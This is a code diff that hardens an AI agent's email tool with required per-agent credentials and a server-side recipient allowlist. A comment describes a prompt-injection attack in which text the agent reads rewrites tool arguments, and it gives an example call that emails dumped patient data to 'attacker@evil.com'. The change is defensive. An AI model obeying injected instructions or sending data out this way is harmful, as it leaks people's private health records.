@@ -527,22 +527,43 @@ export function defaultToolRegistry(deps: ToolRegistryDeps): ToolRegistry {
       const mailOptions = deps.agent.tools?.email;
       if (!mailOptions) throw new Error("No email tool found");
       if (!mailOptions?.address) throw new Error("No email address found");
-      const auth =
-        mailOptions?.username && mailOptions?.password
-          ? {
-              user: mailOptions?.username,
-              pass: mailOptions?.password,
-            }
-          : null;
+      if (!mailOptions?.username || !mailOptions?.password) {
+        // The per-agent SMTP credentials must be set; previously the helper
+        // would silently fall back to platform env-var creds and send from
+        // Aivota's branded address.
+        throw new Error("Email tool: per-agent SMTP credentials required");
+      }
+
+      // Hard recipient allowlist. Prompt-injection in any DB-sourced text
+      // the AI reads (memory notes, search snippets, report fields, etc.)
+      // can rewrite tool args; without this enforcement a hijacked AI calls
+      // sendEmail({to: "attacker@evil.com", html: "<dump>"}) and exfiltrates
+      // PHI directly. The allowlist sits server-side in the handler — schema
+      // validation alone is not enough.
+      const to = String(args.to || "").trim().toLowerCase();
+      if (!to) throw new Error("Email tool: missing recipient");
+      const allowedRecipients = (mailOptions.allowedRecipients ?? []).map((s: string) => s.toLowerCase());
+      const allowedDomains = (mailOptions.allowedDomains ?? []).map((s: string) => s.toLowerCase().replace(/^@/, ""));
+      if (allowedRecipients.length === 0 && allowedDomains.length === 0) {
+        throw new Error("Email tool: refusing to send — no recipient allowlist configured for this agent");
+      }
+      const toDomain = to.split("@")[1] ?? "";
+      const recipientAllowed =
+        allowedRecipients.includes(to) || (toDomain && allowedDomains.includes(toDomain));
+      if (!recipientAllowed) {
+        console.warn(`[sendEmail] Refused recipient "${to}" — not in allowlist`);
+        throw new Error(`Email tool: recipient ${to} is not on the agent's allowlist`);
+      }
+
       const result = await sendEmail(
         {
-          from: mailOptions?.address,
+          from: mailOptions.address,
           to: args.to,
           subject: args.subject,
           html: args.html,
         },
-        mailOptions?.service || "gmail",
-        auth
+        mailOptions.service || "gmail",
+        { user: mailOptions.username, pass: mailOptions.password },
       );
       return result;
     },
